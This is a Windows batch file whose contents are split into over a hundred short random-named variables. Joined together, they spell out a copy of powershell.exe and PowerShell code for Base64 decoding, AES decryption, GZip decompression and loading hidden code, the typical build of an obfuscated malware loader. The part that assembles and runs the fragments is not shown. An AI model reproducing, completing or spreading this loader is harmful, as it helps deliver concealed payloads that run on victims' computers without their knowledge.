@echo off
set "aulaRPHqTB= C"
set "OEwbstseRa=po"
set "HMQpRjdAQs=rs"
set "QeqBDHFuzk=32"
set "JpCrqHCAHp=Sy"
set "NnWMKDtzFS=in"
set "tvkjexqhnD=\v"
set "UOJpJlOiLt=st"
set "CwgxYWGmAc=we"
set "GGSYtbBdDT=py"
set "sNbjgcdUKw=ll"
set "ZUrfRcdkmo=\W"
set "SgWcLyZFkJ=em"
set "ITqLNzEaYq=ll"
set "zjsJtLFNxi=0\"
set "giQtnzpoEN=y "
set "GvAHKUKGiO= /"
set "XhLQRBvZvM=ow"
set "lzCKlmMwfn=nd"
set "tzYDUnfrOC=Wi"
set "QNAWABvIfD=s\"
set "hekSCHkODG=:\"
set "ogOHCcEtGb=we"
set "GYwWdFyFrY=co"
set "ODoWxSDubW=he"
set "etnvAcNhji=.e"
set "GtIBtYOQlJ=ws"
set "qSoyhZMbHF=xe"
set "EWylItFvsM=rS"
set "HWqXzQxhLb=do"
set "uOsVWChEQa=Po"
set "SDJfPtpkLS=he"
set "XMmelLSSjJ=1."
set "CYWXmrrGcZ= %~dp0"
set "FsfroVzBkj=cd"
set "IhWJAWLWdL=)) {"
set "BZcPBxyESI=;$MX"
set "cLXNJGLWfR=l5E7"
set "xiTXxGnVHZ=ewLi"
set "sttAMoXAMm=y.Ci"
set "hEoQUZgdXL=pose"
set "vaDxzOhhRU=ect "
set "DYFppHFkNe=O.Me"
set "JCbejvwMgO=RmAx"
set "cpMnHQUEAg=);$F"
set "ghLCFBvjwx=Star"
set "ARiNcyuXNB=grap"
set "kBFtmvYBhF=);$N"
set "SgBDPGopNr=DfEm"
set "RZtpoTuAuR=.Con"
set "BRddfVxJdY=ing("
set "GFdzntpSut=.Len"
set "scBWndECic=tem."
set "SlYQopfeIq=ew-O"
set "xXBpmcxKgy=KjPf"
set "JJTDCiORAK=Obje"
set "XBlTquCtbA=fore"
set "DRFRpDtWRq=BL.I"
set "PGFWCPaPFx=Stre"
set "dJTPcilVCV=TXqi"
set "XBKjVLPRQv=yste"
set "cfKImSjroH=Pfj."
set "ToFUDXWNif=);$S"
set "QHAGKDDguQ=gjYA"
set "oBYXMJDPZX=('%*'"
set "FHUgkYFClw='txe"
set "njWlfbLTKK=s75K"
set "BQEzayXrUl= '')"
set "BwWyGuKiFN=ct S"
set "iPHqRxHIhP=)($C"
set "JxmTvNPKXz=();$"
set "RyTfXOgSpe=null"
set "RpTNcyamSA=Fina"
set "MTqItVEOFf=.Key"
set "zeWIJYhykP= = ["
set "GZYOEFxsOX=PTtG"
set "rDMmhVbnbF=m.IO"
set "CpspGYzgdn=n ''"
set "QGDjMUsMyW=m.IO"
set "DekCPGXzkY=.Mod"
set "EtUMYOmOcW=[Env"
set "jBicsoivwj=.Com"
set "SaXRLZdbVE=ddin"
set "UBkRAXJKrK=trea"
set "KgPweTTEqC=Disp"
set "lEIBQWxHiR=eam("
set "tnZeKgOAfV=th('"
set "kHnaZNeSeM=.Cre"
set "ezLZxMoSXr=File"
set "FghaLqTcHj=Gl);"
set "kucTLjowRg=PKCS"
set "QjNYjlbZMH=oL'["
set "YxjmjmVPmo=mKOL"
set "OFSOaPHUWB=yTo("
set "ptWnpPDDbh= [Sy"
set "rBOMBqoKjz=e = "
set "dNKyEeWZsZ=pher"
set "jDgrTFvnIl=ateD"
set "VceqqHjZED=.IO."
set "FxVeffEZyS=ring"
set "cCBJsCfGra=tsWi"
set "NLToLPUBMQ=..-1"
set "bxUPrzcnSN=esaB"
set "FjUjGqURvD=]::N"
set "QEYBwRHpgs=$FHK"
set "utqrBYqOID='0Pg"
set "UvZRZtOZiu=OL ="
set "gegJXPpBcd=$JmK"
set "mjooeoOKIg=zuZI"
set "oTiCgILdpH=.Dis"
set "zzVRjIuDro=Conv"
set "cZWaRuakSY=ode]"
set "ipzZVVnNsZ=CB.D"
set "iISjXJwXFL=m.Re"
set "jzaEqPNKsX=Bmor"
set "QSyKservfn=.Sec"
set "zNQcrShHRz=  $C"
set "lfWSCfggfu= = $"
set "PyImuTzyTl=ress"
set "koJhlZQFZM=hy.A"
set "HjtCYJtLog=:('g"
set "dQlzfGFEAO=] -j"
set "zCFmpLkbNm=rofi"
set "YpXUoZPAqE=PxEW"
set "YMfakKQVIi=k; }"
